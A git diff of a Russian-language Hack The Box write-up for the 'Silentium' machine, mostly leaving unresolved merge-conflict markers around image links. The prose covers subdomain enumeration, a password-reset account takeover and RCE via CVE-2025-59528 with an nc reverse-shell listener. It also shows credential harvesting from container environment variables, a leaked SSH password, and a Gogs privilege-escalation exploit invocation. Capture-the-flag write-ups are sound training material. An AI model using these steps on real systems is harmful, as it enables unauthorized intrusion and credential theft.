@@ -5,38 +5,63 @@ share: true
 
 Видим 2 порта ssh (22) и http (80) после проверки OpenSSH и nginx на уязвимости ничего не находим значит идём смотреть что находится по данным портам по порту ssh не находим ничего стоящего, а на порту 80 нас встречает веб-сайт
 
+<<<<<<< HEAD
 ![[Writeups/Machine_HTB/files_photo/Silentium/nmap_scan.png]]
+=======
+![nmap_scan.png](Writeups/Machine_HTB/files_photo/Silentium/nmap_scan.png)
+>>>>>>> 2846cd91e15c1a78990fa2e576d93b81ef983328
 
 2 проверка веб-сайта
 
 Видим что сайт недоступен идём в `/etc/hosts` и добавляем туда сайт:
 `<target-ip> silentium.htb` и перезапускаем сайт
 
+<<<<<<< HEAD
 ![[port_80_browser.png]]
 ![[working_site.png]]
+=======
+![port_80_browser.png](port_80_browser.png)
+![working_site.png](working_site.png)
+>>>>>>> 2846cd91e15c1a78990fa2e576d93b81ef983328
 
 3 ищем с чего начать
 
 После того как сайт заработал идём искать почты/имена или другие данные его владельцев/менеджеров и так далее.
 
 
+<<<<<<< HEAD
 ![[name_leadership_on_site.png]]
+=======
+![name_leadership_on_site.png](name_leadership_on_site.png)
+>>>>>>> 2846cd91e15c1a78990fa2e576d93b81ef983328
 
 4 сканируем сайт
 
 Натыкаемся на 3 человек Бена, Маркуса и Елену. Теперь идём смотреть какие пути есть у этого сайта используя команду `gobuster vhost -u "silentium.htb" -w /usr/share/wordlists/dirb/common.txt --append-domain` ищем какие пути у нас есть
 
+<<<<<<< HEAD
 ![[gobuster_scan.png]]
+=======
+![gobuster_scan.png](gobuster_scan.png)
+>>>>>>> 2846cd91e15c1a78990fa2e576d93b81ef983328
 
 5 точка входа
 
 Gobuster нашёл нам один путь это `staging.silentium.htb` пробуем по нему перейти
 
+<<<<<<< HEAD
 ![[staging_error.png]]
 
 Как и с `silentium.htb` добавляем `staging.silentium.htb` в `/etc/hosts`
 
 ![[staging_working.png]]
+=======
+![staging_error.png](staging_error.png)
+
+Как и с `silentium.htb` добавляем `staging.silentium.htb` в `/etc/hosts`
+
+![staging_working.png](staging_working.png)
+>>>>>>> 2846cd91e15c1a78990fa2e576d93b81ef983328
 
 6 поиск уязвимостей
 
@@ -94,6 +119,7 @@ elena@silentium.htb
 
 пробуем подставить их в первый запрос `curl`
 
+<<<<<<< HEAD
 ![[curl_request.png]]
 
 Как видим нам откликается только почта Бена теперь подставляем полученный `temptoken` во второй запрос
@@ -107,6 +133,21 @@ elena@silentium.htb
 Видим следующий `Dashboard` просмотрев его меня заинтересовал раздел API Keys
 
 ![[dashboard.png]]![[api_key_found.png]]
+=======
+![curl_request.png](curl_request.png)
+
+Как видим нам откликается только почта Бена теперь подставляем полученный `temptoken` во второй запрос
+
+![succes_curl_change_password.png](succes_curl_change_password.png)
+
+Как видим мы поменяли пароль Бену теперь заходим под его обновлёнными данными
+
+![login.png](login.png)
+
+Видим следующий `Dashboard` просмотрев его меня заинтересовал раздел API Keys
+
+![dashboard.png](dashboard.png)![api_key_found.png](api_key_found.png)
+>>>>>>> 2846cd91e15c1a78990fa2e576d93b81ef983328
 
 Теперь вернёмся к найденным CVE а именно к `CVE-2025-59528` благодаря которой можно получить `RCE` для входа на сервер подробнее про это можно почитать тут: https://github.com/advisories/GHSA-3gcm-f6qx-ff7p
 
@@ -127,7 +168,11 @@ curl -X POST http://localhost:3000/api/v1/node-load-method/customMCP \
 
 для этого поднимаем слушатель на порту 4444 с помощью `nc -lvnp 4444`
 
+<<<<<<< HEAD
 ![[nc_listener.png]]
+=======
+![nc_listener.png](nc_listener.png)
+>>>>>>> 2846cd91e15c1a78990fa2e576d93b81ef983328
 
 далее генерируем revershell для нашего POST запроса
 можно воспользоваться этим сайтом: https://www.revshells.com/
@@ -149,6 +194,7 @@ curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
 
 где заменяем параметры с api ключами, ip и порт на нужные нам нажимаем Enter и получаем shell
 
+<<<<<<< HEAD
 ![[shell.png]]
 
 далее осматриваемся в директориях и видим что мы находимся в docker контейнере гуглим каким способом можно выбраться или какие данные можно получить из него
@@ -158,15 +204,34 @@ curl -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
 К сожалению выбраться из него нельзя тогда ищем как можно найти что то полезное в этом контейнере и находим что через команду env можно вывести информацию о всех переменных окружения
 
 ![[env_environment_variable.png]]
+=======
+![shell.png](shell.png)
+
+далее осматриваемся в директориях и видим что мы находимся в docker контейнере гуглим каким способом можно выбраться или какие данные можно получить из него
+
+![list_dir.png](list_dir.png)
+
+К сожалению выбраться из него нельзя тогда ищем как можно найти что то полезное в этом контейнере и находим что через команду env можно вывести информацию о всех переменных окружения
+
+![env_environment_variable.png](env_environment_variable.png)
+>>>>>>> 2846cd91e15c1a78990fa2e576d93b81ef983328
 
 пробуем эти данные для входа в ssh и пароль `r04D!!_R4ge` подходит для ssh сессии 
 прописываем ls -la и находим первый флаг
 
+<<<<<<< HEAD
 ![[user_flag.png]]
 
 Теперь надо поднятся до root первым делом смотрим что запущено на системе с помощью `ps aux` и натыкаемся на интересную программу `gogs`
 
 ![[gogs_web.png]]
+=======
+![user_flag.png](user_flag.png)
+
+Теперь надо поднятся до root первым делом смотрим что запущено на системе с помощью `ps aux` и натыкаемся на интересную программу `gogs`
+
+![gogs_web.png](gogs_web.png)
+>>>>>>> 2846cd91e15c1a78990fa2e576d93b81ef983328
 
  гуглим что это такое:
 
@@ -184,5 +249,10 @@ python3 exploit.py -u http://localhost:3001 -un <YOUR_USER> -pw <YOUR_PASS> -t <
 
 И получаем root доступ и выводим root flag:
 
+<<<<<<< HEAD
 ![[root_success.png]]
 ![[root_flag.png]]
+=======
+![root_success.png](root_success.png)
+![root_flag.png](root_flag.png)
+>>>>>>> 2846cd91e15c1a78990fa2e576d93b81ef983328
